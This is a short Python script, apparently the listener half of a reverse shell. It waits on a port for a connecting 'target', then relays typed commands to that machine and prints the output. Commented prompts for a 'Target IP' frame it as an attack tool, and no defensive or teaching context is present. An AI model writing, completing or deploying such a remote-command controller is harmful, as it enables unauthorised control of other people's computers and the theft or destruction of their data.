import socket
import os
import time 
import sys
#host = input("Enter Your Target IP : ")
#port = int(input("Enter Your  Port: "))
SERVER_HOST = "localhost"
print(SERVER_HOST)
SERVER_PORT = 5555
BUFFER_SIZE = 1024 * 128 
SEPARATOR = "<sep>"
s = socket.socket()
s.bind((SERVER_HOST, SERVER_PORT))
s.listen(5)
print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")
client_socket, client_address = s.accept()
print(f"{client_address[0]}:{client_address[1]} Connected!")
cwd = client_socket.recv(BUFFER_SIZE).decode()
print("[+] Current working directory:", cwd)
while True:
    command = input(f"{cwd} $> ")
    if not command.strip():
        continue
    client_socket.send(command.encode())
    if command.lower() == "exit":
       os.system("kill -9 $(lsof -t -i:{})".format(SERVER_PORT))
       break
    output = client_socket.recv(BUFFER_SIZE).decode()
    results, cwd = output.split(SEPARATOR)
    print(results)